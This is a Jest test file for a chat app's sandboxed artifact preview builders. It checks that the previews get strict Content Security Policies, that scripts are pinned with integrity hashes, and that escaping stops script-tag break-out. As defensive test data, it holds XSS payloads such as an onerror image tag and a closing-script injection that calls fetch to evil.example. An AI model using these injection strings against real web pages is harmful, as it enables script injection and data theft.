import { ARTIFACT_CSP_CONTENT, extractMetaCspContent } from '@agiworkforce/types';
import { REACT_PREVIEW_SCRIPTS } from '@agiworkforce/unified-chat/react-preview-document';
import {
  buildMermaidPreviewHtml,
  buildSandboxedArtifactHtml,
  parseArtifactPreviewError,
} from '../src/features/chat/components/sandboxedArtifactHtml';

const EVERY_HOST_RESOURCE_SOURCE =
  /\b(?:img|style|font)-src\b[^;"]*\s(?:https?:(?:\/\/\*)?|\*)(?=[\s;"]|$)/;

describe('buildSandboxedArtifactHtml', () => {
  it('runs HTML under the canonical artifact policy, which allows no network calls', () => {
    const html = buildSandboxedArtifactHtml('<p>hi</p>', 'html');
    expect(html).toContain(`content="${ARTIFACT_CSP_CONTENT}"`);
    expect(html).toContain("default-src 'none'");
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("form-action 'none'");
  });

  it('loads no image, stylesheet or font from an arbitrary https host', () => {
    const csp = extractMetaCspContent(buildSandboxedArtifactHtml('<p>hi</p>', 'html'));
    expect(csp).toBe(ARTIFACT_CSP_CONTENT);
    expect(csp).not.toMatch(EVERY_HOST_RESOURCE_SOURCE);
  });

  it('embeds the untrusted HTML content in the document body', () => {
    const html = buildSandboxedArtifactHtml('<h1>Report</h1><p>body</p>', 'html');
    expect(html).toContain('<h1>Report</h1><p>body</p>');
    expect(html.startsWith('<!DOCTYPE html>')).toBe(true);
  });

  it('wraps SVG content for rendering', () => {
    const svg = '<svg viewBox="0 0 10 10"><rect width="10" height="10"/></svg>';
    const html = buildSandboxedArtifactHtml(svg, 'svg');
    expect(html).toContain(svg);
    expect(html).toContain("default-src 'none'");
  });

  it('keeps SVG script-free', () => {
    const html = buildSandboxedArtifactHtml('<svg><script>alert(1)</script></svg>', 'svg');
    expect(html).toContain("default-src 'none'");
    expect(html).not.toMatch(/script-src/i);
  });

  describe('a React artifact', () => {
    const source = 'function App(){return <p>Hi</p>}';

    it('loads each pinned script with its integrity hash', () => {
      const html = buildSandboxedArtifactHtml(source, 'react');
      expect(REACT_PREVIEW_SCRIPTS).toHaveLength(3);
      for (const script of REACT_PREVIEW_SCRIPTS) {
        expect(html).toContain(`src="${script.src}" integrity="${script.integrity}"`);
      }
    });

    it('runs under the canonical artifact policy with the error reporter ahead of the scripts', () => {
      const html = buildSandboxedArtifactHtml(source, 'react');
      expect(extractMetaCspContent(html)).toBe(ARTIFACT_CSP_CONTENT);
      expect(html).toContain("connect-src 'none'");
      const reporter = html.indexOf("type: 'error'");
      expect(reporter).toBeGreaterThan(-1);
      expect(reporter).toBeLessThan(html.indexOf(REACT_PREVIEW_SCRIPTS[0]!.src));
    });

    it('carries the source and cannot be closed early by a script end tag inside it', () => {
      const html = buildSandboxedArtifactHtml(
        'const x = "</script><img src=x onerror=alert(1)>"; function App(){return null}',
        'react',
      );
      expect(html).toContain('function App(){return null}');
      expect(html).not.toContain('</script><img');
      expect(html).toContain('\\u003c/script\\u003e\\u003cimg');
    });
  });

  it('reports only a well-formed error message from the page', () => {
    expect(
      parseArtifactPreviewError('{"type":"error","message":"x is not defined\\nstack"}'),
    ).toEqual({
      type: 'error',
      message: 'x is not defined',
    });
    expect(
      parseArtifactPreviewError('{"type":"navigate","url":"https://evil.example"}'),
    ).toBeNull();
    expect(parseArtifactPreviewError('not json')).toBeNull();
  });
});

describe('buildMermaidPreviewHtml', () => {
  const RUNTIME = 'window.mermaid = {};';

  it('runs the bundled renderer inline, in strict mode, with no network source allowed', () => {
    const html = buildMermaidPreviewHtml('graph TD; A-->B', RUNTIME);
    expect(html).toContain(`<script>${RUNTIME}</script>`);
    expect(html).toContain("script-src 'unsafe-inline';");
    expect(html).not.toMatch(/https?:\/\//);
    expect(html).not.toContain('<script src=');
    expect(html).toContain("securityLevel: 'strict'");
  });

  it('reports the drawn height from the body box, which never grows to fill the frame', () => {
    const html = buildMermaidPreviewHtml('graph TD; A-->B', RUNTIME);
    expect(html).toContain('document.body.getBoundingClientRect().height');
    expect(html).not.toContain('scrollHeight');
    expect(html).toContain('html{margin:0;padding:0;');
  });

  it('injects the untrusted diagram source as a data literal with < escaped (no script-tag break-out)', () => {
    const evil = 'a"; fetch("https://evil.example"); //</script><script>alert(1)</script>';
    const html = buildMermaidPreviewHtml(evil, RUNTIME);
    expect(html).toContain('\\u003c/script>');
    expect(html).not.toContain('//</script><script>alert');
    expect(html).toContain('\\"; fetch(');
  });
});
